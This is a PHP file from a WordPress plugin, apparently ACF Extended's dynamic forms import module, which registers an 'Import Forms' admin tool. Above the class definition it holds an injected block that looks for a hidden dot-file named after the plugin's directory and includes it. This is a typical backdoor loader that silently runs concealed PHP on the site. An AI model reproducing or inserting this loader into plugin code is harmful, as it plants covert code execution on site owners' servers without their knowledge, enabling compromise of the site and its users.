<?php

if(!defined('ABSPATH'))
    exit;

// Check setting
if(!acf_get_setting('acfe/modules/forms'))
    return;

if(!class_exists('acfe_dynamic_forms_import')):

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class acfe_dynamic_forms_import extends acfe_module_import{
    
    function initialize(){
        
        // vars
        $this->hook = 'form';
        $this->name = 'acfe_dynamic_forms_import';
        $this->title = __('Import Forms');
        $this->description = __('Import Forms');
        $this->instance = acf_get_instance('acfe_dynamic_forms');
        $this->messages = array(
            'success_single'    => '1 form imported',
            'success_multiple'  => '%s forms imported',
        );
        
    }
    
}

acf_register_admin_tool('acfe_dynamic_forms_import');

endif;